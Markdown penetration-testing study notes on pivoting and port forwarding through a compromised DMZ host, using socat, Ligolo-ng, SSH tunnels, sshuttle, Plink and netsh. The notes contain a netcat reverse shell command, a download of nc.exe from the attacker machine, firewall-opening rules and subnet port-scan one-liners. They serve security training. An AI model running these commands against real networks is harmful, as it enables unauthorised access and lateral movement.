---
layout: blank
---

### Port Forwarding

**Upgrading terminal**
- Might need to run `python3 -c 'import pty; pty.spawn("/bin/sh")'` to upgrade terminal

**Port Redirection and Tunneling examples**
- Port redirection (a type of forwarding): take traffic from one socket and passing it to another
- Tunneling: Encapsulating one type of data inside another (like HTTP inside SSH)
- **How do you know when to port forward?**
	- Once inside a box, use `ip addr`, `ipconfig`, and `ip route` to find connected subnets
	- Then, use scripts like `for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done` to find open ports (a basic nmap for linux)
		- Use ``1..254|%{$ip="172.16.50.$_";$p=445;$t=New-Object Net.Sockets.TcpClient;$r=$t.BeginConnect($ip,$p,$null,$null);if($r.AsyncWaitHandle.WaitOne(1000)){try{$t.EndConnect($r);Write-Host "$ip`:$p open"}catch{}}else{Write-Host "$ip`:$p closed"};$t.Close()}`` for powershell

**Port forwarding with Linux**
- Useful in situations where we need to access an internal server through a DMZ machine we own
- One way of doing this is starting a verbose (-ddd) Socat process listening on some port and forwarding traffic to the internal IP
	- `socat -ddd TCP-LISTEN:{External_Port},fork TCP:{Internal_IP}:{Internal Port}`
- Can also use *rinetd*, netcat + FIFO named pipe, or *iptables* if we have root

### Ligolo-ng
- https://github.com/nicocha30/ligolo-ng/releases/tag/v0.6.2
- Download a proxy file for kali and an agent file for the DMZ machine
- Setup on kali (create tun interface):
	- `sudo ip tuntap add user kali mode tun ligolo`
	- `sudo ip link set ligolo up`
	- `./kali-proxy -selfcert`
		- This will return a port
- (Windows) agent:
	- `ligolo-agent.exe -connect {kali_IP}:{kali_port} -ignore-cert`
	- This program won't exit
- Join a session: `session`, then specify session number
- Adding a pivot (After grabbing network information from client and session running):
	- On kali: `sudo ip route add {ipconfig_IP}/{mask} dev ligolo`
		- Make sure the final IP portion, in front of the mask, is 0 (otherwise `ip` will get mad)
	- Within DMZ session on ligolo: `start`
- Now, we should literally have access to internal machines as though Kali was in the network
- Reverse shell from internal machine -> DMZ -> kali:
	-  `listener_add --addr 0.0.0.0:1338 --to 127.0.0.1:{kali_listening_port}`
		- This created a listener on the DMZ machine on port 1338 to forward all traffic to kali on port 4444
	- Then, we send reverse shells to port 1338 on the DMZ machine, rather than our kali IP
- File upload to internal machine:
	- `python -m http.server` on kali
	- `listener_add --addr 0.0.0.0:1339 --to 127.0.0.1:8000`
		- Forwarding all traffic that reaches DMZ on 1339 to kali on 8000
	- Now, we `iwr/wget {DMZ_IP}:1339/{file}`
	
### SSH Tunneling
- Can also be referred to as "SSH Port Forwarding"
- SSH was designed to securely transmit traffic, so it was used initially for a lot of tunneling

**SSH Local Port Forwarding**
- Done with SSH's `-L` option
	- Used to forward incoming traffic on the current machine from the machine we SSH INTO to another machine
	- `ssh -N -L 0.0.0.0:{current_machine_inbound_port}:{2nd_hop_forwarding_IP}:{forwarding_port} {username}@{intermediary_machine_IP}`
		- `0.0.0.0` just means listening on all interfaces
		- `-N` just means don't show output, so we only see forwarding-related stuff
	- Basically, we are in the network-facing machine. We want to forward traffic from one-hop to two-hops away to an arbitrary port, so we ssh from the pwned box into the one-hop box with the port-forwarding info. The info states that our port (in the example, 4455) will accept incoming connections (e.g. outside the network), send those along ssh, and then ssh on the one-hop machine will forward the traffic to the two-hop machine's port specific in the ssh-command. jeez

**SSH Dynamic Port Forwarding**
- Useful when we want to do more than a 1:1 port forward
	- This basically allows us to shift our commands one machine down
- OpenSSH uses a SOCKS proxy server port to listen, enabling this technique
- Uses the `-D` option
- Usage: `ssh -N -D 0.0.0.0:{inbound_port} {username}@{IP}`
	- This opens 9999 on the internet-facing machine that we control and tells it to accept and forward SOCKS traffic, as shown below
- Then, use *ProxyChains* to communicate over SOCKS
	- Edit `/etc/proxychains4.conf`, putting "socks5 {IP} {port} at the end"
		- This IP and port are the entrance to the internal network that we control
	- `proxychains {command} -L //{IP}/ -U {username} --password={password}`
		- `{command}` could be anything, like `smbclient` or `nmap`
		- The SOCKS traffic would be forwarded to the IP from the machine ssh'd into

**SSH Remote Port Forwarding**
- It's basically using an SSH tunnel's egress traffic to send commands through the client
- Useful when firewalls are getting in the way (e.g. can't ssh in/open new ports)
	- Thus, we set up an SSH server on OUR machine and bind the listening port to the loopback interface
		- Will need to run `sudo systemctl start ssh`
		- This does mean that we're giving the compromised machine our LITERAL credentials, so it might be good to create a new user lmfao
	- This means that packets sent are pushed through the SSH tunnel back to the compromised DMZ machine
- Uses the `-R` option, run from compromised DMZ machine
- Example: listening on 2345 on Kali and forwarding traffic to the 1-hop internal machine
	- `ssh -N -R localhost:{2345}:{internal_1hop_IP}:{internal_1hop_port} username@{kali_IP}`
- Traffic can then be sent to the machine by sending traffic to that port on localhost
	- Example: `psql -h localhost -p {2345} -U {username}`

**SSH Remote Dynamic Port Forwarding**
- Remote, and forwards traffic based on where they're addressed
- Example running on 9998:
	- `ssh -N -R 9998 kali@{kali_IP}`
	- Then, in `/etc/proxychains4.conf`:
		- `socks5 127.0.0.1 9998`
	- `proxychains {command with internal 1-hop IP as target}`
		- `proxychains nmap {internal_IP}`

**Using sshuttle**
- Basically turns SSH into a VPN
- First, port forward in traffic on the pwned machine on a certain port
	- For example, use Socat to allow inbound traffic on 2222, forward it to new machine (whose credentials we know) on port 22, since we're ssh'ing into that machine
- Then, `sshuttle -r {user}@{pwned_target_IP}:{pwned_target_port} {subnet1} {subnet2}`
	- The subnets are ones that we require access to from the pwned machine
- Then, we can just make requests to hosts in the subnet
	- For example, `nmap {private_IP}`

### Port Forwarding with Windows Tools

**Using SSH on Windows**
- Pretty much the same, as it's OpenSSH - comes bundled with Windows after 2018
- Remote Dynamic port forward:
	- Same as linux `ssh -N -R {kali_port} kali@{kali_IP}`
	- Modify kali `/etc/proxychains4.conf` to have `socks5 127.0.0.1 {kali_ssh_port}`
	- Then, same as before, use `proxychains` with commands and internal IPs passed

**Plink**
- OpenSSH might not be on Windows, so Plink might be used instead
- This is used for bypassing a firewall INTO the DMZ machine (going from shell to RDP even with RDP port blocked)
- Need netcat on the target, located in /windows-resources/binaries/nc.exe
	- Grab it with `powershell wget -uri {uri}/nc.exe -OutFile {desired_outfile.exe}`
	- Run a shell with `nc.exe -e cmd.exe {kali_IP} {port}`
- Download plink.exe using same command as above ^^
- `plink.exe -ssh -l kali -pw {pass} -R 127.0.0.1:{kali_port}:127.0.0.1:{port_we_want_to_open_on_DMZ} {kali_ip}`
	- This is basically just ssh'ing into kali to open up a port on the DMZ machine
- Then, for example, `xfreerdp /u:{username} /p:{password} /v:127.0.0.1:{kali_port}`, as the box has SSH'd into kali and is running on kali port, so we can rdp into that

**Netsh**
- Built-in to the firewall, thus should require Administrator
- Assume RDP is open, and we want to go to 1hop internal machine via SSH
- 1st, rdp using `xfreerdp`
- Then, `netsh interface portproxy add v4tov4 listenport={open_port} listenaddress={current_machine_IP_from_kali} connectport={port_of_1hop_machine} connectaddress={1hop_internal_IP}`
	- Need to open {open_port} on the firewall - `netsh advfirewall firewall`
		- `netsh advfirewall firewall add rule name="{any_name}" protocol=TCP dir=in localip={kali_ip} localport={open_port} action=allow`
		- To delete the rule, `netsh advfirewall firewall delete rule "{rule_name}"`
- To delete the port forward, run `netsh interface portproxy del v4tov listenport={open_port} listenaddress={kali_IP}`
- Can verify what is running with `netstat -anp TCP` or `netsh interface portproxy show all`